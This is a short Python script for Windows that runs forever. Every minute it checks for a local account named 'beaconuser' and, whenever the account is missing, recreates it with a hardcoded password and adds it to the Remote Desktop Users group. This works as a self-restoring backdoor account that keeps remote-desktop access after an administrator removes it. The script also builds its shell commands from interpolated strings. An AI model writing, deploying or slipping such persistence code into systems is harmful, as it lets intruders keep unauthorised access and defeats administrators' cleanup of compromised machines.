import subprocess
import time

# Configuration
USERNAME = 'beaconuser'  # Replace with your desired username
PASSWORD = 'StrongPassword123!'  # Replace with your desired password
INTERVAL = 60  # Check interval in seconds

def user_exists(username):
    try:
        output = subprocess.check_output(f'net user {username}', shell=True)
        return True if f'{username}' in output.decode() else False
    except subprocess.CalledProcessError:
        return False

def create_user(username, password):
    try:
        subprocess.run(f'net user {username} {password} /add', shell=True, check=True)
        subprocess.run(f'net localgroup "Remote Desktop Users" {username} /add', shell=True, check=True)
        print(f"User {username} created successfully with RDP access.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to create user {username}: {e}")

def ensure_rdp_access():
    if not user_exists(USERNAME):
        create_user(USERNAME, PASSWORD)
    else:
        print(f"User {USERNAME} already exists. RDP access is ensured.")

if __name__ == "__main__":
    while True:
        ensure_rdp_access()
        time.sleep(INTERVAL)
